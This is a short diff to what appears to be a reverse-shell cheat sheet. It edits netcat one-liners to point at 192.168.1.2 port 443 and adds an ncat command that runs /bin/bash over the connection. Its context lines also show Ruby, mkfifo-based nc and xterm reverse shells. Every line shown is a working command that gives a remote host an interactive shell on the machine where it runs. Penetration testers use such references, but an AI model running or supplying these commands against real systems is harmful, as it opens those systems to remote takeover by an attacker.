@@ -29,9 +29,9 @@ ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.pope
 ## netcat
 nc -e /bin/sh 192.168.1.2 443
 ## or
-nc -e /bin/bash 10.0.0.1 4242
+nc -e /bin/bash 192.168.1.2 443
 ## or
-nc -c bash 10.0.0.1 4242
+nc -c bash 192.168.1.2 443
 ## or
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
 
@@ -42,3 +42,6 @@ p.waitFor()
 
 ## xterm
 xterm -display 192.168.1.2:443
+
+## ncat
+ncat 192.168.1.2 443 -e /bin/bash
